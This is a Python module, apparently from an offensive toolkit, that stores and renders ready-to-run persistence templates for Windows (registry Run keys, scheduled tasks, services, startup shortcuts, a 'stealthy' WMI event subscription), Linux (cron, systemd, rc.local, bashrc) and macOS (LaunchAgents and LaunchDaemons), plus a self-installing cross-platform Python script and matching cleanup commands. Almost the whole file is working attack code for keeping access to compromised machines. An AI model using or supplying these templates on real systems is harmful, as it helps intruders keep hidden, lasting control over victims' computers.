"""
Persistence Mechanisms
Provides various persistence techniques for maintaining access
"""

import os
import random
import string
import platform

PERSISTENCE_TEMPLATES = {
    "windows_registry": {
        "name": "Windows Registry Run Key",
        "description": "Adds entry to HKCU or HKLM Run key for persistence",
        "platform": "windows",
        "requires_admin": False,
        "template": """# Windows Registry Persistence
$key = "%REG_KEY%"
$name = "%ENTRY_NAME%"
$command = "%COMMAND%"

Set-ItemProperty -Path $key -Name $name -Value $command -Force
""",
        "parameters": ["REG_KEY", "ENTRY_NAME", "COMMAND"],
        "cleanup": """Remove-ItemProperty -Path "%REG_KEY%" -Name "%ENTRY_NAME%" -ErrorAction SilentlyContinue"""
    },

    "windows_scheduled_task": {
        "name": "Windows Scheduled Task",
        "description": "Creates scheduled task for persistence",
        "platform": "windows",
        "requires_admin": False,
        "template": """# Windows Scheduled Task Persistence
$taskName = "%TASK_NAME%"
$action = New-ScheduledTaskAction -Execute "%EXECUTABLE%" -Argument "%ARGUMENTS%"
$trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay 00:15:00
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
""",
        "parameters": ["TASK_NAME", "EXECUTABLE", "ARGUMENTS"],
        "cleanup": """Unregister-ScheduledTask -TaskName "%TASK_NAME%" -Confirm:$false -ErrorAction SilentlyContinue"""
    },

    "windows_service": {
        "name": "Windows Service Installation",
        "description": "Installs as Windows service (requires admin)",
        "platform": "windows",
        "requires_admin": True,
        "template": """# Windows Service Persistence (Requires Admin)
$serviceName = "%SERVICE_NAME%"
$displayName = "%DISPLAY_NAME%"
$binaryPath = "%BINARY_PATH%"

# Create service
sc.exe create $serviceName binPath= $binaryPath displayName= $displayName start= auto
sc.exe description $serviceName "%DESCRIPTION%"
sc.exe start $serviceName
""",
        "parameters": ["SERVICE_NAME", "DISPLAY_NAME", "BINARY_PATH", "DESCRIPTION"],
        "cleanup": """sc.exe stop "%SERVICE_NAME%"; sc.exe delete "%SERVICE_NAME%""""
    },

    "windows_startup_folder": {
        "name": "Windows Startup Folder",
        "description": "Places shortcut in user's startup folder",
        "platform": "windows",
        "requires_admin": False,
        "template": """# Windows Startup Folder Persistence
$startupPath = [Environment]::GetFolderPath('Startup')
$shortcutPath = Join-Path $startupPath "%SHORTCUT_NAME%.lnk"
$targetPath = "%TARGET_PATH%"
$arguments = "%ARGUMENTS%"

$wshell = New-Object -ComObject WScript.Shell
$shortcut = $wshell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.Arguments = $arguments
$shortcut.WorkingDirectory = Split-Path $targetPath -Parent
$shortcut.Description = "%DESCRIPTION%"
$shortcut.Save()
""",
        "parameters": ["SHORTCUT_NAME", "TARGET_PATH", "ARGUMENTS", "DESCRIPTION"],
        "cleanup": """Remove-Item -Path "$([Environment]::GetFolderPath('Startup'))\\%SHORTCUT_NAME%.lnk" -ErrorAction SilentlyContinue"""
    },

    "windows_wmi": {
        "name": "WMI Event Subscription",
        "description": "Creates WMI event subscription for stealthy persistence",
        "platform": "windows",
        "requires_admin": True,
        "template": """# WMI Event Subscription Persistence (Stealthy)
$filterName = "%FILTER_NAME%"
$consumerName = "%CONSUMER_NAME%"
$command = "%COMMAND%"

# Create event filter
$filter = Set-WmiInstance -Namespace "root\\subscription" -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
} -ErrorAction Stop

# Create command line consumer
$consumer = Set-WmiInstance -Namespace "root\\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
} -ErrorAction Stop

# Bind filter to consumer
Set-WmiInstance -Namespace "root\\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
} -ErrorAction Stop
""",
        "parameters": ["FILTER_NAME", "CONSUMER_NAME", "COMMAND"],
        "cleanup": """Get-WmiObject -Namespace "root\\subscription" -Class __FilterToConsumerBinding | Where-Object {$_.Filter -eq "%FILTER_NAME%"} | Remove-WmiObject; Get-WmiObject -Namespace "root\\subscription" -Class __EventFilter -Filter "Name='%FILTER_NAME%'" | Remove-WmiObject; Get-WmiObject -Namespace "root\\subscription" -Class CommandLineEventConsumer -Filter "Name='%CONSUMER_NAME%'" | Remove-WmiObject"""
    },

    "linux_cron": {
        "name": "Linux Cron Job",
        "description": "Adds entry to user's crontab for persistence",
        "platform": "linux",
        "requires_admin": False,
        "template": """# Linux Cron Persistence
(crontab -l 2>/dev/null; echo "%CRON_SCHEDULE% %COMMAND%") | crontab -
""",
        "parameters": ["CRON_SCHEDULE", "COMMAND"],
        "cleanup": """crontab -l | grep -v "%COMMAND%" | crontab -"""
    },

    "linux_systemd": {
        "name": "Linux Systemd Service",
        "description": "Creates systemd service for persistence (requires root)",
        "platform": "linux",
        "requires_admin": True,
        "template": """# Linux Systemd Service Persistence (Requires Root)
cat > /etc/systemd/system/%SERVICE_NAME%.service << 'EOF'
[Unit]
Description=%DESCRIPTION%
After=network.target

[Service]
Type=simple
ExecStart=%EXECUTABLE% %ARGUMENTS%
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable %SERVICE_NAME%
systemctl start %SERVICE_NAME%
""",
        "parameters": ["SERVICE_NAME", "DESCRIPTION", "EXECUTABLE", "ARGUMENTS"],
        "cleanup": """systemctl stop %SERVICE_NAME%; systemctl disable %SERVICE_NAME%; rm /etc/systemd/system/%SERVICE_NAME%.service; systemctl daemon-reload"""
    },

    "linux_rc_local": {
        "name": "Linux rc.local",
        "description": "Adds command to rc.local for boot persistence",
        "platform": "linux",
        "requires_admin": True,
        "template": """# Linux rc.local Persistence
grep -q "%COMMAND%" /etc/rc.local || sed -i "/^exit 0/i %COMMAND%" /etc/rc.local
chmod +x /etc/rc.local
""",
        "parameters": ["COMMAND"],
        "cleanup": """sed -i "/%COMMAND%/d" /etc/rc.local"""
    },

    "linux_bash_profile": {
        "name": "Linux Bash Profile",
        "description": "Adds command to user's .bashrc or .profile",
        "platform": "linux",
        "requires_admin": False,
        "template": """# Linux Bash Profile Persistence
echo '%COMMAND%' >> ~/.bashrc
echo '%COMMAND%' >> ~/.profile
""",
        "parameters": ["COMMAND"],
        "cleanup": """sed -i "/%COMMAND%/d" ~/.bashrc ~/.profile"""
    },

    "macos_launchagent": {
        "name": "macOS LaunchAgent",
        "description": "Creates LaunchAgent plist for user-level persistence",
        "platform": "darwin",
        "requires_admin": False,
        "template": """# macOS LaunchAgent Persistence
cat > ~/Library/LaunchAgents/%PLIST_NAME%.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%LABEL%</string>
    <key>ProgramArguments</key>
    <array>
        <string>%EXECUTABLE%</string>
        <string>%ARGUMENTS%</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/%LABEL%.out.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/%LABEL%.err.log</string>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/%PLIST_NAME%.plist
""",
        "parameters": ["PLIST_NAME", "LABEL", "EXECUTABLE", "ARGUMENTS"],
        "cleanup": """launchctl unload ~/Library/LaunchAgents/%PLIST_NAME%.plist; rm ~/Library/LaunchAgents/%PLIST_NAME%.plist"""
    },

    "macos_launchdaemon": {
        "name": "macOS LaunchDaemon",
        "description": "Creates LaunchDaemon plist for system-level persistence (requires root)",
        "platform": "darwin",
        "requires_admin": True,
        "template": """# macOS LaunchDaemon Persistence (Requires Root)
cat > /Library/LaunchDaemons/%PLIST_NAME%.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%LABEL%</string>
    <key>ProgramArguments</key>
    <array>
        <string>%EXECUTABLE%</string>
        <string>%ARGUMENTS%</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

launchctl load /Library/LaunchDaemons/%PLIST_NAME%.plist
""",
        "parameters": ["PLIST_NAME", "LABEL", "EXECUTABLE", "ARGUMENTS"],
        "cleanup": """launchctl unload /Library/LaunchDaemons/%PLIST_NAME%.plist; rm /Library/LaunchDaemons/%PLIST_NAME%.plist"""
    },

    "cross_platform_python": {
        "name": "Cross-Platform Python Persistence",
        "description": "Python-based persistence that works across platforms",
        "platform": "cross",
        "requires_admin": False,
        "template": """# Cross-Platform Python Persistence
import os
import sys
import platform
import subprocess

def install_persistence():
    system = platform.system().lower()
    script_path = os.path.abspath(__file__)
    python_exe = sys.executable
    command = f'"{python_exe}" "{script_path}"'
    
    if system == "windows":
        # Windows Registry
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "PythonAgent_%RANDOM%", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
        return "Windows registry persistence installed"
    
    elif system == "linux":
        # Cron
        cron_entry = f"*/5 * * * * {command}"
        os.system(f'(crontab -l 2>/dev/null; echo "*/5 * * * * {command}") | crontab -')
        return "Linux cron persistence installed"
    
    elif system == "darwin":
        # LaunchAgent
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.python.agent.plist")
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.python.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{__file__}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.python.agent.plist")
        with open(plist_path, "w") as f:
            f.write(plist_content)
        os.system(f"launchctl load {plist_path}")
        return "macOS LaunchAgent persistence installed"
    
    return "Unknown platform"

# Auto-install if run directly
if __name__ == "__main__":
    result = install_persistence()
    print(result)
""",
        "parameters": [],
        "description": "Cross-platform Python persistence installer"
    }
}


def get_persistence_template(name: str) -> dict:
    return PERSISTENCE_TEMPLATES.get(name, {})


def list_persistence_templates() -> list:
    return [
        {
            "name": k,
            "display_name": v["name"],
            "platform": v["platform"],
            "requires_admin": v["requires_admin"],
            "description": v["description"]
        }
        for k, v in PERSISTENCE_TEMPLATES.items()
    ]


def render_persistence_template(name: str, **params) -> str:
    template = PERSISTENCE_TEMPLATES.get(name)
    if not template:
        return ""
    
    content = template["template"]
    for key, value in params.items():
        placeholder = f"%{key.upper()}%"
        content = content.replace(placeholder, str(value))
    
    return content


def get_cleanup_command(name: str, **params) -> str:
    template = PERSISTENCE_TEMPLATES.get(name)
    if not template or "cleanup" not in template:
        return ""
    
    content = template["cleanup"]
    for key, value in params.items():
        placeholder = f"%{key.upper()}%"
        content = content.replace(placeholder, str(value))
    
    return content